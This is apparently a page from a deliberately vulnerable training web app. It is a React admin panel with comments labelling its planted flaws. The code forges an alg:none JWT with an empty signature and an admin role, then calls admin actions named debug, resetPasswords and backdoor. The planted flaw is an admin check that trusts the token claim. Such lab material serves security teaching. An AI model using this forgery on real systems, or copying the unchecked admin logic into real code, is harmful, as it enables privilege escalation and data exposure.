"use client";
// ⚠️ VULNERABILITY: Broken Access Control on Admin Panel
// VULN-050: Relies only on JWT claim for admin check — forgeable with alg:none
// VULN-052: Debug endpoint dumps all env vars
// JWT Forgery: Header={"alg":"none","typ":"JWT"} Body={"id":1,"role":"admin"} Sig=""

import { useEffect, useState } from "react";

export default function AdminPage() {
  const [result, setResult] = useState("");
  const [token, setToken]   = useState("");

  useEffect(() => {
    setToken(localStorage.getItem("token") || "");
  }, []);

  const callAdmin = async (action: string) => {
    const res = await fetch(`/api/admin?action=${action}`, {
      headers: { Authorization: `Bearer ${token}` },
    });
    const data = await res.json();
    setResult(JSON.stringify(data, null, 2));
  };

  const forgeAdminToken = () => {
    // VULN-008: Build alg:none token — backend accepts it
    const header  = btoa(JSON.stringify({ alg: "none", typ: "JWT" })).replace(/=/g, "");
    const payload = btoa(JSON.stringify({ id: 1, username: "admin", role: "admin", iat: Date.now() })).replace(/=/g, "");
    const forged  = `${header}.${payload}.`;  // empty signature
    setToken(forged);
    localStorage.setItem("token", forged);
    alert(`Forged token set:\n${forged}\n\nNow click any admin action.`);
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white p-8">
      <div className="max-w-3xl mx-auto">
        <h1 className="text-3xl font-bold mb-2">Admin Panel</h1>
        <p className="text-red-400 text-sm mb-6">
          VULN-050: Admin check trusts JWT claim only<br />
          VULN-008: alg:none bypass — forge admin token below
        </p>

        <div className="mb-4">
          <label className="block text-sm text-gray-400 mb-1">JWT Token</label>
          <textarea
            value={token}
            onChange={(e) => setToken(e.target.value)}
            rows={3}
            className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 font-mono text-xs"
          />
        </div>

        <div className="flex flex-wrap gap-2 mb-6">
          <button
            onClick={forgeAdminToken}
            className="bg-yellow-700 hover:bg-yellow-600 px-4 py-2 rounded text-sm font-bold"
          >
            🔑 Forge Admin Token (alg:none)
          </button>
          {["debug", "users", "resetPasswords", "backdoor"].map((a) => (
            <button
              key={a}
              onClick={() => callAdmin(a)}
              className="bg-red-800 hover:bg-red-700 px-4 py-2 rounded text-sm"
            >
              {a}
            </button>
          ))}
        </div>

        {result && (
          <pre className="bg-gray-800 rounded p-4 text-xs text-green-400 overflow-auto max-h-96">
            {result}
          </pre>
        )}
      </div>
    </div>
  );
}
